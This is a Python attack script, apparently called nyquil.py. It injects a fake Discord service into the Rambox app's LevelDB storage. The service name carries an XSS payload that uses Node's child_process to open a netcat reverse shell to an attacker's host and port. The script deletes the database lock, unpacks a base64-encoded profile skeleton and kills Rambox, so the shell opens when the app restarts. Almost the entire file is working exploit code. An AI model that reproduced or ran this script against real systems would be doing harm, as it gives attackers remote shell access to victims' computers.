import os
import base64
import psutil
import shutil
import getpass
import platform
import argparse

from zipfile import ZipFile

import plyvel


class Parser(argparse.ArgumentParser):

    def __init__(self):
        super(Parser, self).__init__()

    @staticmethod
    def optparse():
        parser = argparse.ArgumentParser()
        parser.add_argument("-l", "--lhost", dest="lHost", default=None, help="Pass LHOST")
        parser.add_argument("-p", "--lport", dest="lPort", default=None, help="Pass LPORT")
        return parser.parse_args()


# the payload to append to the database
PAYLOAD = (
    "<img src=\"x\" onerror=\"const {{ exec }} = require('child_process');exec('rm /tmp/f;mkfifo /tmp/f;"
    "cat /tmp/f|/bin/bash -i 2>&1|nc {lhost} {lport} >/tmp/f', (err, stdout, stderr) => {{if (err) "
    "{{return;}};console.log(`stdout: ${{stdout}}`);console.log(`stderr: ${{stderr}}`);}});\">Discord</img>"
).replace('"', '\\"')

# the zip file containing the data to put into the discord folder
ZIP_BASE64 = "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"


def create_zip():
    """
    create the zip file if it doesn't exist
    """
    if not os.path.exists("discord.zip"):
        with open("discord.zip", "a+") as z:
            z.write(base64.b64decode(ZIP_BASE64))


def get_root_path(user=getpass.getuser(), current_sys=str(platform.platform()).lower()):
    """
    get the root path of rambox
    """
    if "windows" in current_sys:
        root_path = "c:\\{}\\AppData\\Roaming\\rambox".format(user)
    elif "darwin" in current_sys:
        root_path = "/Users/{}/Library/Application Support/Rambox".format(user)
    elif "linux" or "unix" in current_sys:
        root_path = "/home/{}/.config/Rambox".format(user)
    else:
        root_path = None
    if root_path is None:
        raise OSError("Unsupported Operating System")
    return root_path


def get_database_path(root, current_sys=str(platform.platform()).lower()):
    """
    get the database path to the rambox DB
    """
    if "windows" in current_sys:
        return "{}\\Partitions\\rambox\\Local Storage\\leveldb".format(root)
    else:
        return "{}/Partitions/rambox/Local Storage/leveldb".format(root)


def get_folder_path(root, current_sys=str(platform.platform()).lower()):
    """
    get the partitions path
    """
    count = 1
    if "windows" in current_sys:
        folder = "{}\\Partitions".format(root)
    else:
        folder = "{}/Partitions".format(root)
    for item in os.listdir(folder):
        if "discord" in item:
            count += 1
    if count == 0:
        count = 1
    if "windows" in current_sys:
        retval = "{}\\discord_{}".format(folder, count)
    else:
        retval = "{}/discord_{}".format(folder, count)
    if not os.path.exists(retval):
        os.makedirs(retval)
    return retval


def delete_lock(db_path, current_sys=str(platform.platform()).lower()):
    """
    delete the lock file so we can edit the database
    """
    if "windows" in current_sys:
        path = "{}\\LOCK"
    else:
        path = "{}/LOCK"
    path = path.format(db_path)
    if os.path.exists(path):
        os.remove(path)


def recreate_lock(db_path):
    """
    recreate the LOCK file
    """
    open(db_path + "/LOCK", 'a+').close()


def read_database(db, full_read=False, get_value=True):
    """
    iterate through the database to get a list of tuples of data
    """
    results = []
    with db.iterator() as res:
        for k, v in res:
            if full_read:
                print k + ": " + v
            else:
                results.append((k, v))
    if get_value:
        return results


def count_services(db):
    """
    count the services so we can get a logical number and not overwrite anything
    """
    values = 0
    services = read_database(db)
    for service in services:
        key, value = service[0], service[1]
        if "discord" in value:
            values += 1
    try:
        return int(values)
    except ValueError:
        return 1


def edit_database(db, lhost, lport, db_path):
    """
    edit the database and add our data to it, which will give us our service
    """
    db = plyvel.DB(db)
    current_value_count = count_services(db)
    payload = PAYLOAD.format(lhost=lhost, lport=lport)
    data = """\x01{"position":""" + str(current_value_count+1) + ""","type":"discord","logo":"discord.png","name":""" + '"' + payload + '"' + ""","url":"https://discordapp.com/login","align":"left","notifications":True,"muted":False,"tabname":True,"statusbar":True,"displayTabUnreadCounter":True,"includeInGlobalUnreadCounter":True,"trust":True,"enabled":True,"js_unread":"","zoomLevel":0}""".replace("True", "true").replace("False", "false")
    db.put(b"_file://\x00\x01services-" + str(current_value_count+1), bytes(data))
    db.put(b"_file://\x00\x01services-counter", b"\x01{}".format(current_value_count+1))
    if current_value_count+1 == 1:
        db.delete(b"_file://\x00\x01services")
        db.put(b"_file://\x00\x01services", b"\x011")
    else:
        db.put(b"_file://\x00\x01services", b"\x01{}".format(",".join(str(i) for i in range(1, current_value_count + 2))))
    recreate_lock(db_path)


def copy_data(root):
    """
    copy over the skeleton template to a new discord folder
    """
    filename = "discord.zip"
    destination = get_folder_path(root)
    shutil.copy(filename, destination)
    with ZipFile(filename, 'r') as zip_data:
        zip_data.extractall(path=destination)


def kill_rambox():
    """
    kill rambox
    """
    for proc in (process for process in psutil.process_iter() if "rambox" in str(process.name()).lower()):
        try:
            proc.kill()
        except:
            pass


def main():
    """
    main function
    """
    opt = Parser().optparse()
    if opt.lHost is None:
        print("./nyquil.py -l <IP> [-p <PORT>]")
        exit(1)
    if opt.lPort is None:
        opt.lPort = "9076"
        print("[i] defaulting to port: {}".format(opt.lPort))
    create_zip()
    print("[i] grabbing root path")
    root = get_root_path()
    print("[i] grabbing database path")
    db_path = get_database_path(root)
    print("[i] removing LOCK file")
    delete_lock(db_path)
    print("[i] editing database")
    edit_database(db_path, opt.lHost, opt.lPort, db_path)
    print("[i] copying over data")
    copy_data(root)
    print("[i] killing rambox")
    kill_rambox()
    print("[i] done, waiting for rambox to restart, watch your listener")


if __name__ == "__main__":
    main()
